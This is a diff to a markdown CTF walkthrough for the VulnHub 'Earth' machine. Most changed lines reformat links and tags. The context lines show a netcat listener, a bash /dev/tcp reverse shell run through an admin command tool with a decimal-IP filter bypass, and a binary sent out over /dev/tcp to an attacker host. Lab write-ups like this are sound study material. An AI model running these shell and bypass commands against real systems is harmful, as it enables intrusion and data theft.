@@ -3,9 +3,9 @@ tags:
   - VulnHub
   - Easy
   - Linux
-  - RCE
+  - Info-Disclosure
+  - Web-Shell
   - SUID
-  - File-Analysis
 ---
 https://www.vulnhub.com/entry/the-planets-earth,755/
 # Add Hosts
@@ -41,21 +41,21 @@ PORT    STATE SERVICE  VERSION
 MAC Address: 08:00:27:7E:9A:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ```
 # Discovery
-Site http://earth.local is a secure messaging service in which you insert a plain text message and an encryption key to send an encrypted message. There are already **3 previous encrypted messages**.
+Site `http://earth.local` is a secure messaging service in which you insert a plain text message and an encryption key to send an encrypted message. There are already **3 previous encrypted messages**.
 # Enumeration
 > The website's SSL certificate has expired so cURL should be allowed to make insecure connections with the **-k** parameter.
 ## Command tool
-Found admin command tool at http://earth.local/admin/, but can not access it yet.
+Found admin command tool at `http:/earth.local/admin/`, but can not access it yet.
 ## Files
 
-Found [robots.txt](https://terratest.earth.local/robots.txt) file with useful information:
+Found `https://terratest.earth.local/robots.txt` file with useful information:
 ```console
 $ curl -k https://terratest.earth.local/robots.txt
 
 User-Agent: *
 Disallow: /testingnotes.*
 ```
-Found **username terra** in [testingnotes.txt](https://terratest.earth.local/testingnotes.txt) file which also explains how does the secure messaging system work with **XOR**:
+Found **username terra** in `https://terratest.earth.local/testingnotes.txt` file which also explains how does the secure messaging system work with **XOR**:
 ```console
 $ curl -k https://terratest.earth.local/testingnotes.txt
 
@@ -69,7 +69,7 @@ Todo:
 *Need to test different key lengths to protect against bruteforce. How long should the key be?
 *Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
 ```
-Found [testdata.txt](https://terratest.earth.local/testdata.txt) file which was used as the **original message**:
+Found `https://terratest.earth.local/testdata.txt` file which was used as the **original message**:
 ```console
 $ curl -k https://terratest.earth.local/testdata.txt
 
@@ -85,7 +85,7 @@ Listen to connections to catch the reverse shell:
 ```bash
 nc -lvnp <PORT>
 ```
-Entered to the admin command tool with **username terra** and the **decrypted key**. Then, to bypass the IP filtering parameters, we convert our [IP to decimal](https://iplocation.io/ip-to-decimal/192.168.56.1) and run:
+Entered to the admin command tool with **username terra** and the **decrypted key**. Then, to bypass the IP filtering parameters, we convert our [IP to decimal](https://iplocation.io/ip-to-decimal/) and run:
 ```bash
 bash -i >& /dev/tcp/<ATTACKER-DECIMAL-IP>/<PORT> 0>&1
 ```
@@ -117,7 +117,7 @@ nc -lvnp <PORT> > reset_root
 # Victim's machine
 cat /usr/bin/reset_root > /dev/tcp/<ATTACKER-IP>/<PORT>
 ```
-Analyze binary with [ltrace](https://man7.org/linux/man-pages/man1/ltrace.1.html):
+Analyze binary with `ltrace`:
 ```console
 $ ltrace ./reset_root
 
